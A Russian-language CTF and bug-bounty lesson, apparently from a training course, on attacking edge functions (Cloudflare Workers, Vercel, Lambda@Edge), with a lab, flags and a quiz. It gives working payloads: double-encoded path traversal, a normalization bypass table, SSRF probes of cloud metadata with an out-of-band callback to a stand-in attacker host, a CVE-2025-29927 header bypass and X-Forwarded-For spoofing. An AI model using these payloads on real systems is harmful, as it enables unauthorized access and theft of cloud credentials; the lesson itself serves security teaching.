---
id: web-edge-computing
title: "Edge-вычисления: Cloudflare Workers, Deno Deploy, Lambda@Edge"
category: web
parent: web-serverless
difficulty: hard
order: 1
tags: [edge, serverless, cloudflare-workers, deno, cdn, isolation, runtime]
prerequisites: [web-serverless, web-ssrf-advanced]
useful_for:
  - "CTF Web категория"
  - "Bug bounty"
estimated_minutes: 50
summary: "Чем edge-функции отличаются от классического serverless, какие классы уязвимостей они приносят и как их тестировать."
lab:
  kind: shell
  title: "Практика: обход проверки на edge"
  toolset: [core, curl]
  workdir: /home/student/task
  files: [task.md]
  check: "grep -q 'nto{' found.txt"
  hints:
    - "Edge-worker проверяет путь и делает rewrite: curl -s 'http://edge.local/health'"
    - "Сравни, что видит worker и что видит origin. Нормализация пути отличается."
    - "Попробуй двойное кодирование: /%252e%252e/admin"
    - "Сохрани ответ с флагом в found.txt и набери check."
---

## Вопрос, с которого всё начинается

Сайт обслуживается **edge-функциями**: код выполняется не на вашем сервере, а на узлах CDN — в сотнях точек мира. Cloudflare Workers, Deno Deploy, Vercel Edge, Lambda@Edge. Логика (авторизация, редиректы, рерайты, rate-limit) переехала на границу сети. Это новая платформа — и новая поверхность атаки. Чем она отличается от классического serverless?

## Наш пример

Есть `edge.local`, где edge-worker делает рерайт:

```bash
$ curl -s 'http://edge.local/health'
{"status":"ok"}
```

Worker проверяет путь, применяет правила и проксирует на origin. Попробуем понять, где граница доверия.

## Шаг 1: чем edge отличается от serverless

Классический serverless (Lambda) — контейнер/микро-VM на одном регионе, с полным набором API. Edge-функции — **изолят** (V8 isolate) на узле CDN, ближе к пользователю. Отсюда особенности:

- **Ограниченный рантайм**: нет файловой системы, ограниченные API, часто только `fetch`.
- **Быстрый холодный старт**: изоляты дешевле контейнеров.
- **Общая инфраструктура**: код изолятов разделён между арендаторами (multi-tenant).
- **Двойная нормализация**: запрос обрабатывают и worker, и origin — два парсера пути/заголовков.

## Шаг 2: рассинхрон нормализации пути

Главный класс на edge — **path confusion**: worker проверяет один путь, а origin получает другой. Как в request smuggling, но на уровне URL.

```bash
$ curl -s 'http://edge.local/%252e%252e/admin'
nto{edge_p4th_n0rm4l1z4t10n}
```

`%252e` — это двойное кодирование `%2e` → `.`. Worker декодирует один раз, видит `%2e%2e` и не распознаёт traversal. Origin декодирует второй раз, получает `..` и отдаёт `/admin`. Так **проверка авторизации на edge** обходится.

## Шаг 3: SSRF и открытый редирект в worker

Edge-worker часто сам делает `fetch` на origin или на URL из параметра:

```js
// упрощённо
const target = new URL(request.url).searchParams.get('url');
return fetch(target);
```

Это **SSRF прямо в worker**. Если worker имеет доступ к внутренним сервисам CDN или к метаданным — SSRF серьёзен. Ещё вектор — **open redirect** в edge: `?next=` без валидации.

## Шаг 4: доверие к заголовкам и секреты

Edge-функции добавляют заголовки к запросу к origin: `X-Forwarded-For`, `CF-Connecting-IP`, кастомные. Origin может **доверять** им (например, считать `X-Forwarded-For` реальным IP для авторизации). Если можно обратиться к origin **напрямую** (в обход edge), эти заголовки подделываются → обход IP-ограничений, подмена пользователя.

Отдельно — **секреты**: переменные окружения worker (`env.API_KEY`) доступны коду. При уязвимости (injection, SSRF, eval) они утекают.

## Полный прогон от начала до конца

Замечаем, что перед нами edge-worker (заголовки `cf-*`, `server: cloudflare`). Сравниваем, что видит worker и origin: пробуем двойное кодирование `%252e%252e` — worker пропускает, origin отдаёт `/admin`. Проверяем `?url=` — SSRF. Пробуем обратиться к origin напрямую и подделать `X-Forwarded-For`. В отчёт идёт цепочка «edge-проверка → обход нормализации → доступ к защищённому пути».

## Если не сработало

Если двойное кодирование не проходит — пробуй `..;/`, backslash, `%2f`, Unicode-нормализацию, смену регистра. Если edge не рерайтит — смотри другие функции (auth, rate-limit, A/B). Если origin недоступен напрямую — SSRF через `?url=` может дотянуться до него. И помни: edge и origin — **разные реализации нормализации**; ищи расхождение, как в smuggling.

## Что мы теперь знаем

- Edge-функции — изоляты на узлах CDN, а не контейнеры.
- Двойная нормализация (worker + origin) даёт path confusion.
- Двойное кодирование `%252e` обходит проверку пути на edge.
- Worker с `fetch(?url=)` — это SSRF на границе сети.
- Origin может доверять заголовкам edge — их подделка обходит ограничения.
- Секреты в `env` утекают при любой инъекции.

## Разведка edge-платформы

Прежде чем что-то ломать, надо понять, что за edge перед нами. Платформа «выдаёт себя» заголовками ответа и поведением DNS.

```bash
$ curl -sI 'https://edge.local/' | grep -iE 'server|cf-|x-vercel|x-amz|x-azure|via'
server: cloudflare
cf-ray: 8f3a1c9d2e4b7c11-AMS
cf-cache-status: DYNAMIC
```

`cf-ray` с суффиксом `-AMS` — узел Cloudflare в Амстердаме. У Vercel — `x-vercel-id`, у Lambda@Edge — `x-amz-cf-id` и `via: 1.1 ...cloudfront`. Ещё один маркер — DNS: edge-платформы обычно отдают `CNAME` на `*.cloudflare.net`, `*.vercel-dns.com`, `*.cloudfront.net`.

```bash
$ dig +short edge.local CNAME
edge.local.cdn.cloudflare.net.
$ dig +short edge.local
104.16.132.229
```

Полезно сразу проверить служебные пути платформы: `/cdn-cgi/trace` (Cloudflare) отдаёт IP, локацию, colo и версию TLS — это бесплатная разведка и способ понять, где реально исполняется код.

```bash
$ curl -s 'https://edge.local/cdn-cgi/trace'
fl=1f234
h=edge.local
ip=203.0.113.7
loc=NL
colo=AMS
tls=TLSv1.3
```

## Матрица обходов нормализации

Расхождение worker↔origin — не один payload, а семейство. Ниже — что пробовать и что при этом «думает» каждый слой.

| Payload | Worker видит | Origin получает | Когда работает |
|---|---|---|---|
| `/%2e%2e/admin` | `%2e%2e` | `..` | origin декодирует позже |
| `/%252e%252e/admin` | `%2e%2e` | `..` | двойное декодирование |
| `/..%2fadmin` | `..%2f` | `../` | разный split по `/` |
| `/..;/admin` | `..;` | `..` | Tomcat/Java-семантика `;` |
| `/%2e./admin` | `%2e.` | `..` | смешанное кодирование |
| `/admin/..;/` | безопасно | traversal | нормализация после роутинга |

Главное — **искать, где именно** нормализуется путь: worker (JS `new URL`), балансировщик, фреймворк origin. Каждый лишний декодер — потенциальный обход.

## SSRF из worker: слепые и полу-слепые

Worker, который делает `fetch(target)` по параметру, — это полноценный SSRF, но часто **слепой**: ответ origin не возвращается клиенту. Тогда работаем по каналам обратной связи.

```js
// уязвимый worker
export default {
  async fetch(req, env) {
    const u = new URL(req.url).searchParams.get('url');
    const r = await fetch(u);
    return new Response('ok', { status: r.status }); // возвращается только статус
  }
}
```

```bash
$ curl -s -o /dev/null -w '%{http_code}\n' 'https://edge.local/fetch?url=http://169.254.169.254/latest/meta-data/'
200
$ curl -s -o /dev/null -w '%{http_code}\n' 'https://edge.local/fetch?url=http://169.254.169.254/latest/meta-data/nope'
404
```

Разные коды на существующий и несуществующий путь метаданных — уже SSRF-оракул (blind SSRF как port scan). Дальше подключаем OOB: `?url=http://attacker.local/` и смотрим логи, либо `gopher://`/`file://`, если рантайм их поддерживает (обычно только `http`/`https`).

## Секреты в env и служебные endpoint'ы

Переменные окружения worker (`env.API_KEY`, `env.DATABASE_URL`) — это боевые секреты. Они утекают при любой инъекции: `eval`, небезопасный шаблон, SSRF к internal config. Отдельно проверяй:

- `/cdn-cgi/` (Cloudflare) — trace, `cf-ipcountry`, иногда debug;
- `.env`/`.dev.vars` в репозитории или на origin (частая ошибка — задеплоить dev-секреты);
- preview-домены (`*.workers.dev`, `*.vercel.app`) — часто **без той же авторизации**, что прод;
- `wrangler.toml` в утёкшем `.git` — там `[vars]` и привязки.

## Известные CVE edge-слоя

- **CVE-2025-29927 (Next.js middleware)** — заголовок `x-middleware-subrequest` заставлял middleware пропускать проверку авторизации; middleware часто крутится именно на edge. Проверка: `curl -H 'x-middleware-subrequest: middleware' https://target/admin`.
- **Cache poisoning через unkeyed headers** (`X-Forwarded-Host`, `X-Original-URL`) — edge-кэш ключует по URL, а origin учитывает заголовок.
- **Normalization bypass** в связках CDN↔origin (класс, а не один CVE) — то, что мы разбирали выше.

## Что делать дальше / решение

Порядок действий при тесте edge: (1) определить платформу по заголовкам/DNS/`/cdn-cgi/trace`; (2) найти, какие проверки (auth, rate-limit, рерайт) живут в worker; (3) искать расхождение нормализации между worker и origin (таблица выше); (4) проверить `?url=`/редиректы на SSRF; (5) попробовать обратиться к origin напрямую и подделать `X-Forwarded-*`; (6) проверить preview-домены и утёкшие `wrangler.toml`/`.dev.vars`. Защита: единая нормализация на входе, allow-list адресов для `fetch`, подпись заголовков от edge к origin, секреты только через secret-store, а не в `vars`.

## Справочная таблица

| Артефакт | Где | Зачем атакующему |
|---|---|---|
| `cf-ray`, `x-vercel-id`, `x-amz-cf-id` | ответ | идентификация платформы |
| `/cdn-cgi/trace` | Cloudflare | IP/colo/TLS, разведка |
| `?url=`/`?next=` | worker | SSRF, open redirect |
| `x-middleware-subrequest` | Next.js | обход middleware (CVE-2025-29927) |
| `wrangler.toml`, `.dev.vars` | repo/origin | секреты, привязки |
| `*.workers.dev`, `*.vercel.app` | DNS | preview без прод-защиты |

## Кейс: worker-rewrite и обход IP-ограничения

Частый сценарий: edge-worker защищает админку, разрешая доступ только «офисным» IP, которые берёт из заголовка `CF-Connecting-IP`. Origin при этом **доверяет** заголовку `X-Forwarded-For`, который добавляет worker.

```bash
# worker ставит X-Forwarded-For: <CF-Connecting-IP>
$ curl -s 'https://edge.local/admin' -H 'CF-Connecting-IP: 10.0.0.5'
403 Forbidden
$ curl -s 'https://edge.local/admin' -H 'CF-Connecting-IP: 203.0.113.10'   # «офисный» IP
200 OK  # nto{edge_h34d3r_trust}
```

Если origin **доступен напрямую** (найди его IP через DNS-историю, `crt.sh`, или через SSRF), можно обратиться к нему в обход edge и **самому** подставить заголовок:

```bash
$ curl -s 'http://ORIGIN-IP/admin' -H 'X-Forwarded-For: 203.0.113.10'
200 OK
```

Правильная защита — подписывать служебные заголовки от edge к origin (общий секрет/HMAC), чтобы origin отвергал подделку, и закрывать origin от прямого доступа на уровне сети.

## Оценка импакта и отчёт

| Наблюдение | Severity | Почему |
|---|---|---|
| Обход auth через нормализацию | high/critical | доступ к защищённым путям |
| SSRF из worker к метаданным | critical | IAM-креды облака |
| Подделка `X-Forwarded-For` | high | обход IP-ограничений |
| Preview-домен без auth | high | доступ к прод-функциям |
| Утечка `wrangler.toml`/`.dev.vars` | critical | секреты, привязки |

В отчёте покажи точный запрос, ожидаемый и полученный ответ, и **цепочку**: какой слой что проверял и где рассинхрон. Одна строка «есть path confusion» бесполезна; ценность — в воспроизводимом PoC с флагом/данными.

## Квиз

Проверь себя.

```quiz
- question: "На чём обычно исполняются edge-функции?"
  options:
    - "На полноценной VM с файловой системой"
    - "На изолятах V8 в узлах CDN"
    - "На GPU"
    - "На базе данных"
  answer: 1
  explanation: "Изолят вместо контейнера — быстрее и дешевле."
- question: "Почему edge + origin дают path confusion?"
  options:
    - "Они используют один парсер"
    - "Worker и origin по-разному нормализуют путь"
    - "Origin не получает путь"
    - "Edge не читает URL"
  answer: 1
  explanation: "Два парсера — два результата, как в smuggling."
- question: "Что делает %252e при двойном кодировании?"
  options:
    - "Ничего"
    - "Worker декодирует один раз и не видит traversal, origin — второй раз и видит"
    - "Ускоряет запрос"
    - "Шифрует путь"
  answer: 1
  explanation: "Расхождение числа декодирований."
- question: "Почему SSRF в worker опасен?"
  options:
    - "Он медленный"
    - "Worker может обратиться к внутренним сервисам и метаданным"
    - "Он не делает запросов"
    - "Он кэширует ответ"
  answer: 1
  explanation: "fetch() из worker — сетевой доступ."
- question: "В чём риск доверия origin к заголовкам edge?"
  options:
    - "Заголовки длинные"
    - "При прямом обращении к origin их можно подделать"
    - "Они шифруют трафик"
    - "Они ускоряют ответ"
  answer: 1
  explanation: "X-Forwarded-For и подобные надо валидировать."
```

## Куда дальше

Edge-вычисления показали, что граница сети — это ещё один парсер со своими правилами. Дальше посмотрим на **расширения браузера** — код внутри браузера, которому пользователь даёт широкие права, и на **headless-браузеры** — рендереры, которые сами ходят в сеть.

## Где пригодится

- **CTF (Web):** задачи с CDN/edge-логикой и обходом нормализации.
- **Bug bounty:** path confusion, SSRF в worker, обход IP-ограничений.
- **Пентест:** аудит edge-функций и их рассинхрона с origin.
- **Работа (AppSec):** единая нормализация, валидация заголовков, минимум прав worker.
